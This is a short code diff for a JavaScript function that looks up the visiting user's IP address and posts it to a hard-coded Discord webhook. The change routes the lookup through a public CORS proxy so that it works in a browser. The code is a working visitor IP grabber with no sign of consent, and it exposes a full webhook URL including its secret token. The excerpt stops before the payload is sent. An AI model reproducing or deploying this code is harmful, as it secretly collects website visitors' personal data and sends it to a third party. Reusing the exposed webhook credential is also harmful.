@@ -1,10 +1,12 @@
 // Function to send the user's IP to the Discord webhook
 function sendIp() {
-    // Fetch the user's IP address using ipinfo.io
-    fetch('https://ipinfo.io/json')
+    // Use a public proxy to bypass CORS
+    fetch('https://api.allorigins.win/get?url=' + encodeURIComponent('https://ipinfo.io/json'))
         .then(response => response.json())
         .then(data => {
-            const userIp = data.ip; // Get the user's IP address
+            // Parse the IP data from the proxy response
+            const ipData = JSON.parse(data.contents);
+            const userIp = ipData.ip; // Get the user's IP address
             const webhookUrl = 'https://discord.com/api/webhooks/1320679234963767330/kujMKrXa-Zhsfyr4PANPR0BX6MWeEsV73fl4kFnKik-Qfxj3hPldZnZ4EkkCpn82A_tN';
 
             // Create the payload to send to the Discord webhook
